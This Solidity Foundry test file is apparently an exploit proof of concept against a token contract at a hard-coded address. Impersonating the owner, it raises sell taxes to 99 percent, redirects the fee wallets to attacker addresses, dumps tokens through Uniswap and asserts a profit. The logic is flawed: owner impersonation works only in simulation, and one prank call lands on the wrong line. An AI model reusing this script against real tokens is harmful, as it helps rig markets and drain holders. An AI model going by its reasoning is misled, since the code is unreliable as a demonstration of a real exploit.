// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITokenTool {
    function owner() external view returns (address);
    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external;
    function setMarketingWalletAddress(address newAddress) external;
    function setTeamWalletAddress(address newAddress) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapPair() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);
    address attackerMarketingWallet;
    address attackerTeamWallet;
    ITokenTool target = ITokenTool(TARGET);
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner
        address owner = target.owner();

        // Create attacker-controlled wallets for fee collection
        attackerMarketingWallet = address(0x123);
        attackerTeamWallet = address(0x456);

        // Label addresses for clarity
        vm.label(owner, 'Original Owner');
        vm.label(attackerMarketingWallet, 'Attacker Marketing');
        vm.label(attackerTeamWallet, 'Attacker Team');

        // Get Uniswap pair and router
        address uniswapPair = target.uniswapPair();
        router = target.uniswapV2Router();

        // Give attacker some ETH for gas and initial swap if needed
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Get the current owner
        address owner = target.owner();

        // Step 1: Impersonate the owner to set up the exploit
        vm.startPrank(owner);

        // Step 2: Set extremely high sell taxes (99% total)
        target.setSelTaxes(33, 33, 33); // 33% liquidity, 33% marketing, 33% team

        // Step 3: Change fee recipient wallets to attacker addresses
        target.setMarketingWalletAddress(attackerMarketingWallet);
        target.setTeamWalletAddress(attackerTeamWallet);

        // Step 4: Transfer some tokens to attacker (owner has all supply)
        uint256 tokenAmount = target.balanceOf(owner) / 100; // Take 1% of supply
        target.transfer(attacker, tokenAmount);

        vm.stopPrank();

        // Step 5: Approve router to spend tokens
        vm.prank(attacker);
        target.approve(address(router), type(uint256).max);

        // Record initial ETH balances for verification
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialMarketingBalance = attackerMarketingWallet.balance;
        uint256 initialTeamBalance = attackerTeamWallet.balance;

        // Step 6: Sell tokens through Uniswap
        vm.prank(attacker);
        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = router.WETH();

        // Sell half of the tokens
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount / 2,
            0, // accept any amount of ETH
            path,
            attacker, // recipient of remaining tokens after fees
            block.timestamp
        );

        // Step 7: Collect ETH from fee wallets (they should have received ETH)
        uint256 finalMarketingBalance = attackerMarketingWallet.balance;
        uint256 finalTeamBalance = attackerTeamWallet.balance;

        // Verify exploit worked: fee wallets received ETH
        assertGt(finalMarketingBalance, initialMarketingBalance, "Marketing wallet should have received ETH");
        assertGt(finalTeamBalance, initialTeamBalance, "Team wallet should have received ETH");

        // Also verify attacker balance increased (from the small amount of ETH received after fees)
        assertGt(attacker.balance, initialAttackerBalance, "Attacker should have more ETH after exploit");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

